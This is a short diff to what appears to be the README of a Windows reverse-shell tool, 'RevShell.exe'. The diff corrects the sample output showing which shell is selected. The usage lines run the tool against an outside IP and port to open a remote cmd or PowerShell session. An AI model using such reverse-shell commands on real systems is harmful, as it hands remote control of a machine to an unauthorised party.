@@ -36,7 +36,7 @@ C:\RevShell> RevShell.exe 195.135.15.7 12345 cmd
 > Open a PowerShell session
 ```
 C:\RevShell> RevShell.exe 195.135.15.7 12345 powershell
-[+] SELECTED SHELL:     0
+[+] SELECTED SHELL:     1
 [+] VALID IP ADDRESS:   195.135.15.7
 [+] VALID IP PORT:      12345
 ```
